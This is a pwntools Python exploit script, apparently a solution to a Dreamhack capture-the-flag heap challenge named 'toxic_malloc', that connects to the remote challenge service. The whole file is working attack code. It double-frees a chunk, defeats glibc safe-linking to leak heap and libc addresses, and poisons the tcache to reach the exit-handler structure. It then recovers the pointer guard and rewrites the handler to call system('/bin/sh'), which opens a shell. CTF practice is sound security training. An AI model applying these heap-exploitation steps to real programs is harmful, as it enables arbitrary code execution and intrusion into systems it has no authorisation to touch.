from pwn import *

port = 23053
rem = remote("host8.dreamhack.games", port)

lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")

def safe_link(pos, ptr):
  return (pos >> 12) ^ ptr

def decrypt_safe_linking(ptr):
  _12bits = []
  dec = 0
  while ptr != 0:
    _12bits.append(ptr & 0xfff)
    ptr = ptr >> 12

  x = _12bits.pop()
  while len(_12bits) > 0:
    dec |= x
    dec = dec << 12
    y = _12bits.pop()
    x = x ^ y
  dec |= x

  return dec

def create(idx, data):
  rem.sendlineafter(b'choice:', b"1")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendafter(b': ', data)

def update(idx, data):
  rem.sendlineafter(b'choice:', b"2")
  rem.sendlineafter(b': ', str(idx).encode())
  rem.sendafter(b': ', data)

def read(idx, dummy = b"data: "):
  rem.sendlineafter(b'choice:', b"3")
  rem.sendlineafter(b": ", str(idx).encode())
  rem.recvuntil(dummy)
  return rem.recvline()

def delete(idx):
  rem.sendlineafter(b'choice:', b"4")
  rem.sendlineafter(b": ", str(idx).encode())

def exit():
  rem.sendlineafter(b'choice:', b"5")

create(0, b'A' * 8)
create(1, b'A' * 8)

delete(0)
update(0, p64(0) * 2)
delete(0)
heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0

for i in range(1, 7):
  update(0, p64(0) * 2)
  delete(0)

lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
initial = lib_base + 0x21bf00
dl_fini_addr = lib_base + 0x233040
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + next(lib.search(b"/bin/sh"))

update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
create(2, p64(safe_link(heap_base+0x2a0, initial)))
create(3, b"B" * 16)
payload = b"C" * 0x18
create(4, payload)

mangle_dl_fini = u64(read(4, payload).rstrip().ljust(8, b'\x00'))
pointer_guard = ror(mangle_dl_fini, 0x11, word_size=64) ^ dl_fini_addr
update(4, p64(0) + p64(1) + p64(4) + p64(rol(sys_addr ^ pointer_guard, 0x11, word_size=64)) + p64(binsh_addr))

exit()

rem.interactive()